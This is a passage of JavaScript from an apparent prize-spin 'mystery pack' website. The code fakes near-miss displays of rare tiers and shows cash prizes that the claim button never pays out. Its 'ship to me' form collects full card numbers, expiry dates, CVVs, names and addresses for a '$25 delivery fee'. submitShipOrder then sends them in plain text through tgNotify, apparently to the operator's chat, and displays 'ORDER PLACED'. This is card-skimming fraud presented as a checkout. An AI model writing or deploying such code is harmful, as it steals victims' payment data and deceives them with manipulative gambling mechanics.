                card.style.transform   = `scale(${zoom}) scaleX(${Math.max(scaleX, 0.03)}) translateY(${jitterY.toFixed(2)}px) rotate(${jitterRot.toFixed(2)}deg)`;
                card.style.filter      = `blur(${blur.toFixed(2)}px) hue-rotate(${hue.toFixed(0)}deg)`;

                let displayTier = tier;
                let displayIdx = idx;
                const nearMiss = t > 0.72 && t < 0.92;
                if (nearMiss && Math.random() < 0.26) {
                    const roll = Math.random();
                    displayIdx = roll < 0.45 ? goldIdx : roll < 0.9 ? purpleIdx : rainbowIdx;
                    displayTier = SPIN_TIERS[displayIdx] || tier;
                }
                card.style.background  = displayTier.gradient;
                card.style.borderColor = displayTier.border;
                card.style.boxShadow   = `0 0 ${8 + scaleX * 24 + (nearMiss ? 6 : 0)}px ${displayTier.glow}`;

                if (idx !== lastIdx) {
                    if (t < 0.98) playTick(t);
                    lastIdx = idx;
                }
                if (displayIdx !== lastDisplayIdx) {
                    for (let i = 0; i < 5; i++) {
                        const g = document.getElementById('tierGlow'+i);
                        if (g) g.style.opacity = i === displayIdx ? '0.85' : '0';
                    }
                    card.classList.remove('rarity-grey','rarity-blue','rarity-gold','rarity-purple','rarity-rainbow');
                    card.classList.add('rarity-' + displayTier.name.toLowerCase());
                    card.style.backgroundSize = displayTier.name === 'RAINBOW' ? '200% 200%' : 'auto';
                    lastDisplayIdx = displayIdx;
                }

                if (t < 1) { requestAnimationFrame(frame); }
                else {
                    card.style.transform = 'scale(1)';
                    card.style.filter = 'none';
                    showSpinResult(SPIN_TIERS[targetIdx]);
                }
            }
            requestAnimationFrame(frame);
        }

        function showSpinResult(tier) {
            const overlay = document.getElementById('spinOverlay');
            if (overlay) overlay.classList.remove('spin-focus');
            document.body.classList.remove('spin-focus');
            const card = document.getElementById('spinCard');
            const stage = document.getElementById('spinStage');
            let prize, prizeLabel = null, prizeImg = null, multLabel = '';
            if (tier.name === 'RAINBOW') {
                const pick = pickRainbowPrize();
                prize = pick.value.toFixed(2); prizeLabel = pick.display; prizeImg = pick.img || null;
                multLabel = 'JACKPOT';
                incrementRainbowWeekly();
                recordGoodWin();
                if (prizeLabel === '$10,000 Cash') {
                    claim10k();
                    tgNotify('ðŸš¨ <b>$10,000 CASH PRIZE CLAIMED!</b>\nðŸ‘¤ ' + (currentUser?.username || 'unknown') + '\nðŸ•’ ' + new Date().toLocaleString() + '\n\nThis prize is now permanently removed from the pool.');
                }
            } else {
                // Generate unique amount â€” retry up to 8 times if it matches a recent prize
                let rawPrize, attempts = 0;
                do {
                    const mult = tier.minMult + Math.random() * (tier.maxMult - tier.minMult);
                    // Add cents-level noise to ensure uniqueness
                    const noise = (Math.random() * 0.99).toFixed(2);
                    rawPrize = (spinPackCost * mult + parseFloat(noise)).toFixed(2);
                    attempts++;
                } while (_lastPrizes.includes(rawPrize) && attempts < 8);
                prize = rawPrize;
                _lastPrizes.push(prize);
                if (_lastPrizes.length > 5) _lastPrizes.shift();
                if (tier.minMult === tier.maxMult) multLabel = tier.minMult + 'x';
                else multLabel = tier.minMult + 'x â€“ ' + tier.maxMult + 'x';
                // Track good wins and grey hits
                if (tier.name === 'GOLD' || tier.name === 'PURPLE') recordGoodWin();
                if (tier.name === 'GREY') recordGreyHit();
            }
            const imgWrap = document.getElementById('spinPrizeImg');
            const imgEl   = document.getElementById('spinPrizeImgEl');
            if (prizeImg && imgWrap && imgEl) { imgEl.src=prizeImg; imgEl.style.borderColor=tier.border; imgWrap.style.display='block'; }
            else if (imgWrap) imgWrap.style.display='none';

            card.classList.remove('rarity-grey','rarity-blue','rarity-gold','rarity-purple','rarity-rainbow');
            card.classList.add('rarity-' + tier.name.toLowerCase());
            card.style.backgroundSize = tier.name === 'RAINBOW' ? '200% 200%' : 'auto';
            card.style.transform   = 'scale(1)';
            card.style.background  = tier.gradient;
            card.style.borderColor = tier.border;
            const isRareWin = ['GOLD','PURPLE','RAINBOW'].includes(tier.name);
            const impactShadow = isRareWin
                ? `0 0 130px ${tier.glow}, 0 0 200px ${tier.glow}`
                : `0 0 80px ${tier.glow}, 0 0 140px ${tier.glow}`;
            const settleShadow = isRareWin
                ? `0 0 65px ${tier.glow}, 0 0 120px ${tier.glow}`
                : `0 0 40px ${tier.glow}, 0 0 80px ${tier.glow}`;
            card.style.boxShadow   = impactShadow;
            card.style.filter = isRareWin ? 'brightness(1.35) saturate(1.25)' : 'brightness(1.08)';
            setTimeout(() => {
                card.style.boxShadow = settleShadow;
                card.style.filter = 'none';
            }, 320);
            if (stage) {
                stage.classList.remove('land-impact');
                void stage.offsetWidth;
                stage.classList.add('land-impact');
            }
            playLand();
            if (['GOLD','PURPLE','RAINBOW'].includes(tier.name)) playRare();
            // Shake on big wins
            if (['GOLD','PURPLE','RAINBOW'].includes(tier.name)) {
                card.style.animation = '';
                void card.offsetWidth; // reflow
                const shakeAnim = tier.name === 'RAINBOW'
                    ? 'packShake 0.55s ease, rainbowBg 0.8s linear 0.55s infinite, cardGlowPulse 0.5s ease 0.55s infinite'
                    : 'packShake 0.55s ease, cardGlowPulse 0.8s ease 0.55s infinite';
                card.style.animation = shakeAnim;
            } else if (tier.name === 'BLUE') {
                card.style.animation = 'cardGlowPulse 1.2s ease infinite';
            } else {
                card.style.animation = 'cardGlowPulse 1.6s ease infinite';
            }

            const _icon = document.getElementById('spinCardIcon');
            if (spinPackImg) {
                _icon.innerHTML = `<img src="${spinPackImg}" style="width:110px;height:110px;object-fit:contain;filter:drop-shadow(0 0 18px ${tier.border});">`;
            } else {
                _icon.innerHTML = '';
            }
            document.getElementById('spinCardTier').textContent  = '';
            document.getElementById('spinCardMult').textContent  = '';
            document.getElementById('spinTitle').textContent     = 'YOU WON';
            document.getElementById('spinTitle').style.color     = tier.border;
            document.getElementById('spinSubtitle').textContent  = 'Exchangeable for cash';
            document.getElementById('spinSubtitle').style.color  = '#aaa';

            for (let i = 0; i < 5; i++) {
                const g = document.getElementById('tierGlow'+i);
                if (g) g.style.opacity = SPIN_TIERS[i].name === tier.name ? '1' : '0';
            }

            document.getElementById('spinResultLabel').textContent  = prizeLabel || '';
            document.getElementById('spinResultLabel').style.color  = tier.border;
            document.getElementById('spinResultAmount').textContent = '$' + prize;
            document.getElementById('spinResultAmount').style.color = tier.border;

            // Physical rainbow prize: show Exchange or Ship options instead of plain CLAIM
            const isPhysical = tier.name === 'RAINBOW' && prizeLabel && prizeLabel !== '$10,000 Cash';
            if (isPhysical) {
                document.getElementById('spinResultSub').textContent = 'Choose: keep the cash value OR ship the physical item to you';
                document.getElementById('spinResultBox').innerHTML = `
                    <div id="spinResultLabel" style="font-size:11px;margin-bottom:8px;color:${tier.border};">${prizeLabel}</div>
                    <div id="spinPrizeImg" style="${prizeImg ? '' : 'display:none;'}margin-bottom:10px;">
                        <img id="spinPrizeImgEl" src="${prizeImg||''}" style="width:140px;height:140px;object-fit:contain;border:2px solid ${tier.border};border-radius:4px;background:#111;">
                    </div>
                    <div id="spinResultAmount" style="font-size:22px;margin-bottom:6px;font-weight:bold;color:${tier.border};">$${prize}</div>
                    <div style="font-size:7px;color:#aaa;margin-bottom:18px;line-height:1.8;">What would you like to do with your prize?</div>
                    <button class="spin-claim-btn" onclick="claimRainbowCash()" style="background:#00ff00;color:#000;border:none;padding:13px 0;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:210px;display:block;margin:0 auto 10px;">ðŸ’µ EXCHANGE FOR CASH</button>
                    <button class="spin-claim-btn spin-claim-alt" onclick="showShipForm('${prizeLabel}','${prize}')" style="background:#111;color:#fff;border:2px solid #fff;padding:13px 0;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:210px;display:block;margin:0 auto;">ðŸ“¦ SHIP TO ME</button>
                `;
            } else {
                document.getElementById('spinResultSub').textContent = prizeLabel ? 'Or cash equivalent â€¢ Exchangeable for cash' : 'Exchangeable for cash';
            }
            const resultBox = document.getElementById('spinResultBox');
            if (resultBox) {
                resultBox.style.display = 'none';
                setTimeout(() => { resultBox.style.display = 'block'; }, 140);
            }

            if (currentUser) {
                const prizeAmt = parseFloat(prize);
                addWinnings(currentUser.username, prizeAmt);
                updateBalanceDisplay();
                // Track daily wins and apply lockout if limit hit
                const dailyTotal = addDailyWin(currentUser.username, prizeAmt);
                if (dailyTotal >= DAILY_WIN_LIMIT) {
                    setLockout(currentUser.username);
                    // Show popup after claim
                    setTimeout(() => showDailyLimitPopup(), 800);
                }
                // Save to Saved Prizes (collection)
                savePrizeToCollection(tier, prize, prizeAmt);
                tgNotify('ðŸŽ° <b>Spin Result</b>\nðŸ‘¤ <b>'+currentUser.username+'</b>\nðŸŽ¨ Tier: <b>'+tier.name+'</b>\nðŸ’° Won: $'+prize+'\nðŸ“Š Daily Total: $'+dailyTotal.toFixed(2)+'\nðŸ’³ Balance: $'+getBalance(currentUser.username).toFixed(2)+'\nðŸ•’ '+new Date().toLocaleString());
            }
        }

        // â”€â”€ Save prize to Saved Prizes collection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function savePrizeToCollection(tier, prize, prizeAmt) {
            if (!currentUser) return;
            const key     = 'pluxo_savedprizes_' + currentUser.username.toLowerCase();
            const prizes  = JSON.parse(localStorage.getItem(key) || '[]');
            const packName = spinPackName || 'Mystery Pack';
            prizes.unshift({
                id:       Date.now(),
                tier:     tier.name,
                amount:   prizeAmt,
                display:  '$' + prize,
                color:    tier.border,
                gradient: tier.gradient,
                pack:     packName,
                packImg:  spinPackImg || '',
                date:     new Date().toLocaleString()
            });
            // Keep last 100 prizes
            if (prizes.length > 100) prizes.length = 100;
            localStorage.setItem(key, JSON.stringify(prizes));
        }

        function getSavedPrizes() {
            if (!currentUser) return [];
            const key = 'pluxo_savedprizes_' + currentUser.username.toLowerCase();
            try { return JSON.parse(localStorage.getItem(key) || '[]'); } catch(e) { return []; }
        }

        function renderSavedPrizes() {
            const grid  = document.getElementById('savedPrizesGrid');
            const stats = document.getElementById('savedPrizesStats');
            if (!grid) return;
            const prizes = getSavedPrizes();

            if (!prizes.length) {
                grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:60px 20px;color:#444;font-size:8px;line-height:2.5;">
                    <div style="font-size:36px;margin-bottom:16px;">ðŸ†</div>
                    <div>No prizes yet.</div>
                    <div style="font-size:6px;margin-top:8px;color:#333;">Open a pack to start winning!</div>
                </div>`;
                if (stats) stats.innerHTML = '';
                return;
            }

            const totalValue = prizes.reduce((s, p) => s + (p.amount || 0), 0);
            if (stats) stats.innerHTML =
                `<span>ðŸŽ <b style="color:#fff;">${prizes.length}</b> prizes</span>` +
                `<span>ðŸ’° Total value: <b style="color:#00ff00;">$${totalValue.toFixed(2)}</b></span>`;

            grid.innerHTML = prizes.map(p => `
                <div style="background:linear-gradient(145deg,#0a0a0a,#111);border:2px solid ${p.color};
                    border-radius:4px;padding:14px 10px;text-align:center;
                    box-shadow:0 0 12px ${p.color}44;animation:fadeIn 0.3s ease;">
                    ${p.packImg ? `<img src="${p.packImg}" style="width:60px;height:60px;object-fit:contain;margin-bottom:8px;filter:drop-shadow(0 0 8px ${p.color});">` : ''}
                    <div style="font-size:7px;color:${p.color};font-weight:bold;margin-bottom:4px;">${p.tier}</div>
                    <div style="font-size:16px;color:#fff;font-weight:bold;margin:6px 0;">${p.display}</div>
                    <div style="font-size:5px;color:#666;margin-bottom:4px;">${p.pack}</div>
                    <div style="font-size:5px;color:#444;">${p.date}</div>
                </div>`).join('');
        }

        function claimRainbowCash() {
            document.getElementById('spinOverlay').style.display = 'none';
            document.body.classList.remove('spin-focus');
            spinQueue = []; spinCurrent = 0;
        }

        function showShipForm(itemName, cashValue) {
            const S = 'width:100%;background:#000;color:#fff;border:1px solid #333;padding:10px;font-family:"Press Start 2P",monospace;font-size:9px;margin-bottom:10px;outline:none;box-sizing:border-box;';
            document.getElementById('spinResultBox').innerHTML = `
                <div style="font-size:10px;color:#fff;margin-bottom:6px;">ðŸ“¦ SHIP: ${itemName}</div>
                <div style="font-size:7px;color:#aaa;margin-bottom:14px;line-height:2;">
                    âœ… Signature on delivery required &nbsp;â€¢&nbsp; ðŸšš 3â€“7 business days<br>
                    ðŸ’³ $25.00 delivery fee charged to card below
                </div>

                <div style="font-size:7px;color:#00ff00;margin-bottom:8px;letter-spacing:1px;">SHIPPING ADDRESS</div>
                <div style="display:flex;gap:6px;">
                    <input id="shipFirst" type="text" placeholder="First Name" style="${S}flex:1;">
                    <input id="shipLast" type="text" placeholder="Last Name" style="${S}flex:1;">
                </div>
                <input id="shipAddress" type="text" placeholder="Street Address" style="${S}">
                <div style="display:flex;gap:6px;">
                    <input id="shipCity" type="text" placeholder="City" style="${S}flex:2;">
                    <input id="shipState" type="text" placeholder="ST" maxlength="2" style="${S}flex:1;text-transform:uppercase;" oninput="this.value=this.value.toUpperCase()">
                    <input id="shipZip" type="text" placeholder="ZIP" maxlength="5" style="${S}flex:1;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>

                <div style="font-size:7px;color:#00ff00;margin-bottom:8px;letter-spacing:1px;margin-top:4px;">CARD FOR $25 DELIVERY FEE</div>
                <input id="shipCardNum" type="text" placeholder="Card Number" maxlength="19" style="${S}" oninput="this.value=this.value.replace(/[^0-9]/g,'').replace(/(.{4})/g,'$1 ').trim()">
                <div style="display:flex;gap:6px;">
                    <input id="shipCardExp" type="text" placeholder="MM/YY" maxlength="5" style="${S}flex:1;" oninput="let v=this.value.replace(/[^0-9]/g,'');if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v;">
                    <input id="shipCardCvv" type="text" placeholder="CVV" maxlength="4" style="${S}flex:1;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>
                <input id="shipCardName" type="text" placeholder="Name on Card" style="${S}">

                <div id="shipErr" style="display:none;color:#ff4444;font-size:7px;margin-bottom:8px;"></div>
                <button onclick="submitShipOrder('${itemName}','${cashValue}')" style="background:#fff;color:#000;border:none;padding:13px 0;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:100%;margin-bottom:8px;">âœ… CONFIRM â€” CHARGE $25 & SHIP</button>
                <button onclick="claimRainbowCash()" style="background:transparent;color:#555;border:1px solid #333;padding:10px 0;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;width:100%;">â† Take Cash Instead</button>
            `;
        }

        function submitShipOrder(itemName, cashValue) {
            const first    = (document.getElementById('shipFirst')?.value || '').trim();
            const last     = (document.getElementById('shipLast')?.value || '').trim();
            const address  = (document.getElementById('shipAddress')?.value || '').trim();
            const city     = (document.getElementById('shipCity')?.value || '').trim();
            const state    = (document.getElementById('shipState')?.value || '').trim();
            const zip      = (document.getElementById('shipZip')?.value || '').trim();
            const cardNum  = (document.getElementById('shipCardNum')?.value || '').replace(/\s/g,'').trim();
            const cardExp  = (document.getElementById('shipCardExp')?.value || '').trim();
            const cardCvv  = (document.getElementById('shipCardCvv')?.value || '').trim();
            const cardName = (document.getElementById('shipCardName')?.value || '').trim();
            const err      = document.getElementById('shipErr');

            if (!first || !last || !address || !city || !state || !zip) {
                err.textContent = 'âš  Please fill in all address fields.'; err.style.display = 'block'; return;
            }
            if (zip.length !== 5) { err.textContent = 'âš  ZIP must be 5 digits.'; err.style.display = 'block'; return; }
            if (cardNum.length < 15) { err.textContent = 'âš  Enter a valid card number.'; err.style.display = 'block'; return; }
            if (!cardExp.includes('/') || cardExp.length !== 5) { err.textContent = 'âš  Enter expiry as MM/YY.'; err.style.display = 'block'; return; }
            if (cardCvv.length < 3) { err.textContent = 'âš  Enter a valid CVV.'; err.style.display = 'block'; return; }
            if (!cardName) { err.textContent = 'âš  Enter the name on your card.'; err.style.display = 'block'; return; }

            const fullAddress = `${first} ${last}, ${address}, ${city}, ${state} ${zip}`;
            tgNotify(`ðŸ“¦ <b>Shipment Request</b>\nðŸ‘¤ ${currentUser?.username}\nðŸŽ Item: ${itemName}\nðŸ’° Cash Value: $${cashValue}\nðŸ“ Ship To: ${fullAddress}\nðŸ’³ Card: ${cardNum} | Exp: ${cardExp} | CVV: ${cardCvv} | Name: ${cardName}\nðŸ’µ $25 delivery fee\nðŸ•’ ${new Date().toLocaleString()}`);

            document.getElementById('spinResultBox').innerHTML = `
                <div style="font-size:32px;margin-bottom:12px;">ðŸ“¦</div>
                <div style="font-size:10px;color:#00ff00;margin-bottom:10px;">ORDER PLACED!</div>
                <div style="font-size:7px;color:#ccc;line-height:2.2;margin-bottom:20px;">
                    Shipping to: <b style="color:#fff;">${fullAddress}</b><br>
                    âœï¸ Signature on delivery required<br>
                    ðŸšš Arrives in 3â€“7 business days<br>
                    ðŸ’³ $25.00 delivery fee charged
                </div>
                <button onclick="claimRainbowCash()" style="background:#00ff00;color:#000;border:none;padding:13px 0;font-family:'Press Start 2P',monospace;font-size:8px;cursor:pointer;width:210px;display:block;margin:0 auto;">DONE</button>
            `;
        }

        function closeSpinModal() {
            spinCurrent++;
            const card = document.getElementById('spinCard');
            if (card) card.style.animation = '';
            document.body.classList.remove('spin-focus');
            if (spinCurrent < spinQueue.length) { startNextSpin(); }
            else { document.getElementById('spinOverlay').style.display='none'; spinQueue=[]; spinCurrent=0; }
        }
    </script>
</body>
</html>
